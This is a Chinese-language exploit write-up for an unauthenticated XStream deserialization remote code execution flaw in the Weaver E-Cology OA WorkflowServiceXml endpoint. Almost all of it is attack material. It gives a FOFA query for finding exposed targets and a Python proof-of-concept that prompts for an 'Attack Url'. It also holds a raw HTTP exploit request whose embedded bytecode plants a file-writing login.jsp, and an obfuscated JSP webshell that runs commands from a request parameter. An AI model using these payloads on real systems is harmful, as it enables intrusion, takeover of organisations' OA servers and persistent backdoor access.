# 泛微E-Cology WorkflowServiceXml RCE也叫xstream反序列化

## 漏洞描述

泛微E-cology OA系统的WorkflowServiceXml接口可被未授权访问，攻击者调用该接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程代码执行

## 漏洞影响


> E-cology <= 9.0

## FOFA


> app="泛微-协同办公OA"

## 漏洞复现

漏洞分析请看宽字节安全团队：

https://mp.weixin.qq.com/s/iTP9jBypsJEsSlAIaNOnhw
##Poc
```
import base64
import requests
import random
import re
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def POC_1(target_url):
    vuln_url = target_url + "/services%20/WorkflowServiceXml"
    cmd = "net user"
    headers = {
        'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)',
        'SOAPAction': '""',
        'potats0': cmd,
        "Content-Type": "text/xml;charset=UTF-8"
    }
    data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
       <soapenv:Header/>
       <soapenv:Body>
          <web:doCreateWorkflowRequest>    <web:string>
    <java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='javafx.collections.ObservableList$1'/>
    </default>
    <int>3</int>
    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
      <dataHandler>
        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
          <contentType>text/plain</contentType>
          <is class='java.io.SequenceInputStream'>
            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
              <iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'>
                <names class='java.util.AbstractList$Itr'>
                  <cursor>0</cursor>
                  <lastRet>-1</lastRet>
                  <expectedModCount>0</expectedModCount>
                  <outer-class class='java.util.Arrays$ArrayList'>
                    <a class='string-array'>
                      <string>$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$d9W$TW$i$fe$G$C3$M$c3b$Qa$5c$b1u$J$w$c1$ee$V$a9$VA$5c$g$d0$g$8a$Vm$ed0$5c$60$m$cc$c4$c9D$90$$v$b3$9b$ddwk$b7$97$k_$db$3eDO$7b$da$d3$87$be$d8S$l$da$3f$a8$f6$bb$93$40$J$89$da$9c$93$7b$e7$fe$eeo$bb$bf$ef$bb$bf$99$3f$fe$f9$e9W$A$f7$e3$5b$j$G$S$3a$G0$a8$e1$88$9c$8f$eax$i$c7$e4$90$d40$a4$e3$J$Mk8$ae$e2I$j$3aN$a8$Y$d1q$S$a7$a4$d9SR$f2$b4$86$d3r$7eF$87$85Q9$d8$g$c6T$I$N$e3$3a$9a1$a1aR$85$a3aJ$c5$b4$8e$Uft$ac$81$ab$c1$93sZ$Og$e4$e0k$c8$a8$It$dc$8d$ac$8a$b3$K$aa$bb$j$d7$J$f6$u$a8$8c$b5$P$x$88$f4zcBAC$c2q$c5$60vfT$f8C$d6h$8a$92h$c2$b3$ad$d4$b0$e5$3br$bd$m$M$ect$c6$b3$a7E$40$fd$e9$de$945$3f$af$60Eb$ca$3aku$a6$yw$a2$93$a2Lf7$V$tD$d0$9b$f5$7d$e1$G$c7$c4$99$ac$c8$E$D$KV$_Q$f4$c5xJ$d8A$e7$80$I$s$bd1Z$d4$dbE$ea2$81$ff$b4$8f$8cNQ$99Z$ca$b8$C$b3$8c$9b$7eG$a4$a4$X$cd$X$99$b4$e7f$98$ab$ce$U$8e$fbN$m$7c$86Vf$V4$e6$ed$i$af3$_$de$9d$d79$u$ac$b1P$a7$d2$9e$Z$x$O$9b$M$7c$c7$9d$90a3$K$9a$f2$h$d9$c0Iu$sm$cbuC$P$K$p5$_1$d9$3fg$8bt$e0x$$$f7$o$c1$a4C$c3$9a$c4x$d6$9e$3e$e7e$v$aaK$G$96$3d$3d$60$a5$c3$82$S$Q$S$40$c5$y$e1W1Gt$J$v$f1$q$60$cc$z$e9e$7d$5b$f4$3b$b2$f0F$c1E$5cF2$b0$F$5bU$9c30$8fg$Z$868$d9$G$9e$c3$f3$w$5e0p$k$_$gx$J$_$x$d8j$7b3q$db$ca$da$93$5e$dc$V$c1$ac$e7O$c7SN$s$Qn$7c$c8N$t$XqT$f1$8a$81Wq$81P$96$c0Fj$yC$d7$c0kx$9d$d5$5c$8e$O$8fa$e0$N$bci$e0$z$5c4$f06$$$d2$f6$f4$C$k$fd$96$cd2$hx$H$ef$f2$a4$G$de$c3$fb$G$3e$c0$87$y$cf$oN$qA1B$KbioV$f8b$acm$f4$5c$5b$da$L$ac$m$e3$b5$95$fd$Z$f8$I$l$e7$9d$e5$B$z$ca0$P$a4$C5$efc$tOZ$C$a6$8aO$M$7c$8a$cfdu$3fWPq$aa$c7$c0$r$7ca$e02$be4$f0$V$beV$A$b2$a0$M$d4$G$be$c1V$3a$_$60$a4$a0$f5V$3cW$d0r$L$ee$$d$U$ee$i$cb$ba$813S$e0$f0$e2$a29$d6$9e$u$d1$914$Ts$c2$s$da$b1R$e6$$58$ea$7b$b6$I$_$e7$92$c2$MM$fa$ac$WyY$b8$7d$L$eb$95E$b1$f2RZ6K$7exn$m$e6$82$90$L$J$__j$b3H$7d$c9$96$b4$v$bbA$a8R$7c$I$r$K6$df$n$f7$85$b6$o$e1$5d$a8$e4$de26$tKl$dao$d7s$aa$j$f7$ac7$cd$d2$ee$8a$956$9b$93$a5$a2$f6r$zI$935$c9$l$a3$a9$b4$M$f2$ceS$n$99M$L$df$cek5r$dd$t$b8$m$af$L$d8w$dc$e1$fc$cb$db$5c$5dF$E$3d$b6$84$d3$J$fbr$q6$o$9by$r$3d$x$d8R$e60e3$af$9a$95$b7L$S$abL$f4$e1$oF$W$c8$c3$h$ca$Q$87$dct6$a0$9e$b0fH$e8$853$f3$d6$$$d9$a0$fb$d6X$d9$N$e9$d9$c8fD$9fH93$f9$5b$7e$h$ea$$k$b7$ea$a4$95$Z$q$fb$c2$d7$d7$I$P$ee$86$8bb$ba$$$b6$ed$864$l$82$b0$e5$O$f9$96$z$b0$R$9b$f9$82$95$3fvn$d9E9$c6$80$8avT$a3$96$d2$bf$b7$5d$85r$N$V$d1$ca$i$o$c7$af$a1$w$87$ea$a8$9a$83$96$d8$k$ad$a9$fc$Fz$O$b5$D$3b$U$3e$Z9$d4$Nv$e4P$9fCC$b41$87$V$5d$R3$S$c9$njF$um$ea$aa2i$5b$l$5dY0$ea$aa6$ab$cd$aa$82$ddoh$eeRM5$ba$w$87$W$e9$o$da$g$a1$d6$89$ca$a8$99$94$aa$9a$a9uP$60P$b0$3a$Z$aa$9b$5d5$3fc$cd$J$sf$d60$b1$i$d6$5e$c5$ba$e8$fa$i6t$e9$a6j2$40$db$r$d4$cay$e3$VTE$ef$a2$df$x2$e7$i6$fd$c0$TFp$j$7f$f2$D$a0$S$ed$3c$e3$m$9a8$g$94$d6$a3$O$N0$d1$88MX$818$a2$e8$e6$de$3e$ac$c4a$7ea$8c$60$V$a6$d0$823h$c5$Fj$5d$c2j$fc$c8$_$8a$ebXOokq$D$eb$f0$X6$60$h$bd$cd$d3$9f$89$ef$b1$j$3b$Yo$T$beC$H$fdU$f0$7f$Z$9d$d8$c9$c8$dd$ec$fc$f7$e0$5eF$3d$cc7$d4$7d$94U1$82$c7O$a58k$3f$85$d3x$A$PBe$a4$3e$3cD$99$c6x$3b$f10v$a1$86Q$5b$d0$85$dd$fc$g$baA$fbn$3c$c2$Y$c4$K$7b$f0$u$e7$bd$fc$3b$88$dc$c4$ef$a8U$d1$a3b$9f$8a$5e$V$7d$w$f6$87$p$9f$fb$c3$f1$80$8a$83P$b8$baI$fb$ff$a1Z$R$ae$O$dcd$a6$b4$ea$91$c3$a1$IM$P3$60$F$k$fb$X$9f$s$83$aa$ec$J$A$A
</string>
                    </a>
                  </outer-class>
                </names>
                <processorCL class='com.sun.org.apache.bcel.internal.util.ClassLoader'>
                  <parent class='sun.misc.Launcher$ExtClassLoader'>
                  </parent>
                  <package2certs class='hashtable'/>
                  <classes defined-in='java.lang.ClassLoader'/>
                  <defaultDomain>
                    <classloader class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='../..'/>
                    <principals/>
                    <hasAllPerm>false</hasAllPerm>
                    <staticPermissions>false</staticPermissions>
                    <key>
                    </key>
                  </defaultDomain>
<domains class="java.util.Collections$SynchronizedSet" serialization="custom">
        <java.util.Collections_-SynchronizedCollection>
          <default>
            <c class="set"></c>
            <mutex class="java.util.Collections$SynchronizedSet" reference="../../.."/>
          </default>
        </java.util.Collections_-SynchronizedCollection>
      </domains>                  <packages/>
                  <nativeLibraries/>
                  <assertionLock class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='..'/>
                  <defaultAssertionStatus>false</defaultAssertionStatus>
                  <classes/>
                  <ignored__packages>
                    <string>java.</string>
                    <string>javax.</string>
                    <string>sun.</string>
                  </ignored__packages>
                  <repository class='com.sun.org.apache.bcel.internal.util.SyntheticRepository'>
                    <__path>
                      <paths/>
                      <class__path>.</class__path>
                    </__path>
                    <__loadedClasses/>
                  </repository>
                  <deferTo class='sun.misc.Launcher$ExtClassLoader' reference='../parent'/>
                </processorCL>
              </iterator>
              <type>KEYS</type>
            </e>
            <in class='java.io.ByteArrayInputStream'>
              <buf></buf>
              <pos>0</pos>
              <mark>0</mark>
              <count>0</count>
            </in>
          </is>
          <consumed>false</consumed>
        </dataSource>
        <transferFlavors/>
      </dataHandler>
      <dataLen>0</dataLen>
    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>
  </java.util.PriorityQueue>
</java.util.PriorityQueue></web:string>
            <web:string>2</web:string>
          </web:doCreateWorkflowRequest>
       </soapenv:Body>
    </soapenv:Envelope>'''.format(cmd=cmd)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        if "powered by potatso" in response.text and response.status_code == 500:
            print("\033[36m[o] 存在漏洞 \n[o] 响应为:\n{} \033[0m".format(response.text))
    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

if __name__ == '__main__':
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    POC_1(target_url)
```
##exp:

```java
POST /services%20/WorkflowServiceXml HTTP/1.1
Accept-Encoding: gzip, deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""
Content-Length: 21168
Host: : 1.1.1.1
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
   <soapenv:Header/>
   <soapenv:Body>
      <web:doCreateWorkflowRequest>
	    <web:string><java.util.PriorityQueue serialization="custom">
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class="org.apache.commons.beanutils.BeanComparator">
        <property>outputProperties</property>
        <comparator class="org.apache.commons.collections.comparators.ComparableComparator"/>
      </comparator>
    </default>
    <int>3</int>
    <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl serialization="custom">
      <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
        <default>
          <__name>Pwner</__name>
          <__bytecodes>
            <byte-array>yv66vgAAADIANwoADAAmBwAnCAAoCgACACkHACoKAAUAJggAKwoABQAsCgACAC0HAC4HAC8HADABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE0xSZXNpbi9Mb2dpbkZpbHRlcjsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAMQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAuAQAKU291cmNlRmlsZQEAEExvZ2luRmlsdGVyLmphdmEMAA0ADgEAGGphdmEvaW8vRmlsZU91dHB1dFN0cmVhbQEAH0Q6XFdFQVZFUlxlY29sb2d5XGNzc1xsb2dpbi5qc3AMAA0AMgEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIBALhQQ1VnYm1WM0lHcGhkbUV1YVc4dVJtbHNaVTkxZEhCMWRGTjBjbVZoYlNoeVpYRjFaWE4wTG1kbGRGQmhjbUZ0WlhSbGNpZ2laaUlwS1M1M2NtbDBaU2h1WlhjZ2MzVnVMbTFwYzJNdVFrRlRSVFkwUkdWamIyUmxjaWdwTG1SbFkyOWtaVUoxWm1abGNpaHlaWEYxWlhOMExtZGxkRkJoY21GdFpYUmxjaWdpZENJcEtTazdKVDRLDAAzADQMADUANgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFSZXNpbi9Mb2dpbkZpbHRlcgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAFd3JpdGUBAAUoW0IpVgAhAAsADAAAAAAABAABAA0ADgABAA8AAAAvAAEAAQAAAAUqtwABsQAAAAIAEAAAAAYAAQAAAAwAEQAAAAwAAQAAAAUAEgATAAAAAQAUABUAAgAPAAAAPwAAAAMAAAABsQAAAAIAEAAAAAYAAQAAABkAEQAAACAAAwAAAAEAEgATAAAAAAABABYAFwABAAAAAQAYABkAAgAaAAAABAABABsAAQAUABwAAgAPAAAASQAAAAQAAAABsQAAAAIAEAAAAAYAAQAAAB4AEQAAACoABAAAAAEAEgATAAAAAAABABYAFwABAAAAAQAdAB4AAgAAAAEAHwAgAAMAGgAAAAQAAQAbAAgAIQAOAAEADwAAAF4AAwABAAAAHbsAAlkSA7cABLsABVm3AAYSB7YACLYACacABEuxAAEAAAAYABsACgADABAAAAASAAQAAAAQABgAEwAbABIAHAAUABEAAAACAAAAIgAAAAcAAlsHACMAAAEAJAAAAAIAJQ==</byte-array>
          </__bytecodes>
          <__transletIndex>-1</__transletIndex>
          <__indentNumber>0</__indentNumber>
        </default>
        <boolean>false</boolean>
      </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
    </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
    <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl reference="../com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"/>
  </java.util.PriorityQueue>
</java.util.PriorityQueue></web:string>
        <web:string>2</web:string>
      </web:doCreateWorkflowRequest>
   </soapenv:Body>
</soapenv:Envelope>
```

通过xstream反序列化漏洞login.jsp

```java
<% new java.io.FileOutputStream(request.getParameter("f")).write(new sun.misc.BASE64Decoder().decodeBuffer(request.getParameter("t")));%>
```

再去写入jsp马

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="sun.misc.BASE64Decoder" %>
<%
    if(request.getParameter("cmd")!=null){
        BASE64Decoder decoder = new BASE64Decoder();
        Class rt = Class.forName(new String(decoder.decodeBuffer("amF2YS5sYW5nLlJ1bnRpbWU=")));
        Process e = (Process)
                rt.getMethod(new String(decoder.decodeBuffer("ZXhlYw==")), String.class).invoke(rt.getMethod(new
                        String(decoder.decodeBuffer("Z2V0UnVudGltZQ=="))).invoke(null, new
                        Object[]{}), request.getParameter("cmd") );
        java.io.InputStream in = e.getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```

